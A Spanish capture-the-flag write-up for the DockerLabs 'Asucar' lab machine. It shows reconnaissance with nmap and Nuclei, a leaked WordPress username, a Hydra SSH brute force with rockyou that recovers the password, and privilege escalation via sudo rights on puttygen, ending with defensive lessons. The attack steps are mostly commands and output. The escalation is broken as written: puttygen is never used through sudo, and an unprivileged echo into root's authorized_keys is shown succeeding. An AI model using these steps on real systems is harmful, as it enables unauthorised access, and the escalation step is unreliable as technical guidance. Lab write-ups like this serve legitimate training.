# Asucar — DockerLabs

**Plataforma:** The Hackers Labs  
**Dificultad:** 🟡 Medio  
**SO:** Linux  
**Autor de la máquina:** The Hackers Labs  
**Fecha de creación:** 12/05/2024  
**Técnicas:** WordPress · Nuclei · Hydra · SSH · Puttygen sudo abuse · Authorized Keys Injection

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración WordPress](#2-enumeración-wordpress)
3. [Fuerza bruta SSH — Hydra](#3-fuerza-bruta-ssh--hydra)
4. [Acceso SSH](#4-acceso-ssh)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh asucar.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

Servicios detectados:

```text
OpenSSH 8.9p1 Debian
Apache httpd 2.4.59
WordPress 6.5.3
```

---

## 2. Enumeración WordPress

Identificamos que el servidor utiliza WordPress.

Accediendo a:

```text
http://172.17.0.2/wp-admin
```

Observamos el dominio:

```text
asucar.dl
```

Lo añadimos a `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

```text
172.17.0.2 asucar.dl
```

Utilizamos Nuclei para buscar rutas vulnerables:

```bash
nuclei -u http://asucar.dl
```

Resultado:

```text
/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?action=ajax
```

Al explorar la ruta encontramos un posible usuario:

```text
curiosito
```

---

## 3. Fuerza bruta SSH — Hydra

Realizamos fuerza bruta contra el usuario encontrado:

```bash
hydra -l curiosito -P /usr/share/wordlists/rockyou.txt \
ssh://172.17.0.2
```

Resultado:

```text
login: curiosito
password: food
```

---

## 4. Acceso SSH

Accedemos mediante SSH:

```bash
ssh curiosito@172.17.0.2
```

Contraseña:

```text
food
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/puttygen
```

---

## 5. Escalada de privilegios

Investigamos el binario permitido:

```bash
sudo /usr/bin/puttygen --help
```

Observamos que permite generar claves privadas SSH.

Generamos un par de claves:

```bash
ssh-keygen -t rsa
```

Copiamos nuestra clave pública al archivo autorizado de root:

```bash
echo "TU_CLAVE_PUBLICA" >> /root/.ssh/authorized_keys
```

Ahora accedemos directamente como root:

```bash
ssh root@172.17.0.2
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| WordPress expuesto | Superficie de ataque ampliada |
| Información sensible filtrada | Descubrimiento de usuarios |
| Contraseña débil SSH | Acceso inicial |
| puttygen ejecutable con sudo | Escalada a root |
| Manipulación de authorized_keys | Persistencia y acceso privilegiado |

**Para defenderse:**

- Mantener WordPress y plugins actualizados.
- Aplicar políticas robustas de contraseñas.
- Restringir binarios peligrosos mediante sudo.
- Proteger correctamente claves SSH y archivos `authorized_keys`.
- Limitar exposición de rutas sensibles.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
